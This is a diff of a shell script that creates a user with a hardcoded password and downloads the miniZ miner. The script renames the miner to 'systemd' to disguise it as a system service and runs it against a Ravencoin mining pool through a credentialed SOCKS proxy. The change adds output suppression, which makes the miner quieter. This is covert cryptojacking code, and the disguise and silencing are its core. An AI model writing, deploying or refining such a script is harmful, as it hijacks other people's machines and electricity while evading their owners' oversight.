@@ -3,7 +3,7 @@
 # Define variables
 new_username="isolated_user"
 password="isolate123"
-original_command="./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns "
+original_command="./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns"
 
 # Check if user exists
 if id "$new_username" &>/dev/null; then
@@ -40,5 +40,5 @@ tar -xvf miniZ_v2.3c_linux-x64.tar.gz
 # Move miniZ to systemd
 mv miniZ systemd
 
-# Execute the original command
-$original_command
+# Execute the original command and suppress output
+$original_command >/dev/null 2>&1
